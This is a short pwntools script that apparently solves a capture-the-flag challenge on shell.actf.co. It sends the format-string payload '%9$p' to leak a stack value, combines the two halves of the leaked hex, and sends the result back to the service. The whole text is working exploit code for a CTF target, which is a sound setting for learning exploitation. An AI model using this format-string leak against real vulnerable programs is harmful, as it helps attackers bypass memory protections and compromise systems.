from pwn import *

p = remote('shell.actf.co', 18101)
print p.recvline()
print p.recvline()
p.sendline('%9$p')
a = p.recv()
print a
num =  a.split()[-2][:-2]
fnum = num[-8:] 
snum = num[:-8]
res = int('0x'+fnum,16)+int(snum, 16)
print res
p.sendline(str(res))
print p.recvline()
